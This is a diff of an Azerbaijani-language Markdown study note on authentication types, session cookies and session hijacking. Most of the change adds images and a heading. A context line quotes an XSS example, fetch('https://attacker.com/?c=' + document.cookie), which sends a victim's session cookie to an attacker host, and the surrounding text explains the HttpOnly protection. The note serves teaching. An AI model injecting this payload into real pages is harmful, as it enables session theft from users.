@@ -1,4 +1,4 @@
-## AUTH Tipləri:
+<img width="245" height="426" alt="image" src="https://github.com/user-attachments/assets/d11548b7-9094-4ef0-8a3d-b453baeddc9d" />## AUTH Tipləri:
 1) *Password-based* – Universitet portalına hər dəfə username və şifrə yazaraq daxil olursan.
 
 2) *MFA* – Bank hesabına girişdə şifrəni yazırsan, sonra telefonuna gələn SMS kodu təsdiqləyirsən.
@@ -50,6 +50,11 @@ fetch("https://attacker.com/?c=" + document.cookie)
 
 Admin/user səhifəni açır
 Brauzer session cookie-ni JS-ə verir
+
+## Session Hijacking 
+
+<img width="245" height="426" alt="image" src="https://github.com/user-attachments/assets/01150f1f-877d-426b-ae54-135fc6060a38" />
+
 
 *HttpOnly VARSA*
 
